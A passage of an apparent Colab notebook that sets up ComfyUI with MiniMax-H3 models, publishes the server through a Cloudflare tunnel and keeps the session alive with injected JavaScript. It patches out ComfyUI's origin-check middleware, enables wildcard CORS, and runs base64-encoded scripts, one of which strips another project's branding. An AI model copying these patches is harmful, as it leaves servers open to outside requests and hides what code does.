sPaOPfmox0RM9UZifWrxEgo0WMJGzZKoCCS7xjQptxaUtzLGhK9U5s9cbuKwUOW9ixQ2dQo09gTsIT+AuysJy4DtF1TJbNv65dej7nuDY2Oy5yS4gqpofQFI2QccQ4qASA1B6NUt4VFjd3LgSQucU3TQMRR93lwshAiyhFTaQzymaZXbHT/JhLSpUHuIOnc2ZHr3UxQgP3UPm7xj+8NiuXUPKtK1j0MVHb4h5jguZQUxcFOM4C7igsm+HsYO6Z/rEVui9jugkypBBk+DbHMJ2NP8ZNeut6ys68d3R1/sR1yjGJGxzcSdmu9azlEYzizLqOlQZVW7ISfxeqeYrHYl90uuOfML18r40mADfcvGgp/R19k8ojFgdzyJLvBgpRT5Jr5+GoH0j+tv+oSt0Kc7R11Ou2TEWDHvkfmAqdIgZJsRViv9qSFyXg2NIBExY+OQXL9x798sEwHxml1vpp1y87mNu6IeXrlNbvllXBwd4DRpZgG0Z79WLLG70u1kn14Xx6PAaMF6CRuUBGoPdbKfH7YDt+v595rOLtC2uDzaZphb6t5uIAnIcG/aCJs0KHO94MQe8YRbHS9hA5Zy8oQcrWjtx/2asHMyTKNUJuKN3LjwfUx9jDHM0uvj9dM7M2KP3RdjM5Kla/v7T0ZGRPkTca1tru5sO/lVCnrqp6dEob2PG6fckaljmwBZ1lF4Bd/IVFgr6PTzbCx2aL/r7y84lwLmLPHgsxNQdXTgZ98OuKHEhMAc9PCGGotvkUmgPJgX7RxjWVO9ovXZ+aWp0REy3Cf0rDHhTHRW0cB5JJfpZ4Z/Vgf2koSTw8DRB/1GK86ujOok6Kg9JHcNqeEDx61qtUjdqlSLRdLVYb5YbRZXMNYqGqjbVStOYqdSM8+hidqCL6UxdzDyQLqa5LmYeUBeoBQY9QQilWUwPOl3MPJIQS2Wp5S8O4cZaUT3NNNnfkeCGWod6YrGaHTUnuzWfuK/0fygh4CE=")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

In [ ]:
# @title 🖼️ 3. 全参视频选项（官方64G全参底模 + 默认25G CLIP）
import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
轻量化CLIP选择 = "25G 官方INT8均衡版 (Comfy-Org原版8位量化 · 99.5%无损精度)"

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model = "【64G满血原版-全能参考视频】minimax_h3_ref2va_bf16.safetensors"
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in os.listdir(diff_dir):
    if f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(os.path.join(diff_dir, f))
for f in os.listdir(clip_dir):
    if f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(os.path.join(clip_dir, f))

print(f"⏳ 正在检查/下载 64G 官方全参底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", diff_dir, "-o", target_model,
    "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/diffusion_models/minimax_h3_ref2va_bf16.safetensors"
], check=True)

print(f"⏳ 正在检查/下载官方配套 CLIP: {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        os.unlink(_p)
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _pool = "/content/lora_pool_qwen" if ("千问" in _f or "Qwen" in _f or "qwen" in _f or "Anime2Real" in _f or "2anime" in _f) else "/content/lora_pool_h3"
        os.replace(_p, os.path.join(_pool, _f))
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        os.symlink(os.path.join("/content/lora_pool_h3", _f), os.path.join(_lora_active, _f))
print("🧹 已切换为【H3视频专属LoRA与工作流配置】")

wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json") and ("qwen" in _wf.lower() or "千问" in _wf):
        os.replace(os.path.join(wf_dir, _wf), os.path.join("/content/wf_pool_qwen", _wf))
import shutil as _sh
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not os.path.exists(os.path.join(wf_dir, _wf)):
        _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), os.path.join(wf_dir, _wf))
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
ONE_DAY: int = 86400
IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
        return response
    if request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganN